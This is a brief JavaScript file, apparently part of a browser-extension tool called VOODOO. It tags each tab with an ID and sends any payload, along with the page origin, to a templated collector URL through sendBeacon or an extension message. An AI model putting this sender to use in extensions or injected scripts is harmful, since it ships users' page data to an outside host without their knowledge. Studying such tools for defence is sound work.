if (!sessionStorage.tab_uuid) {
    sessionStorage.setItem("tab_uuid", Math.random().toString(16).substring(2));
}

const VOODOO = {
    options: { collector_url: "%{collector_url}" },
    send(payload) {
        if (!VOODOO.options.collector_url) {
            return;
        }

        const body = JSON.stringify({
            time: new Date().getTime(),
            tab_uuid: sessionStorage.tab_uuid,
            origin: window.location.origin,
            payload
        });

        if (window.location.href.indexOf("_generated_background_page.html") !== -1) {
            return navigator.sendBeacon(VOODOO.options.collector_url, body);
        }

        chrome.runtime.sendMessage({
            collector_url: VOODOO.options.collector_url, body
        });
    }
};

const V = VOODOO;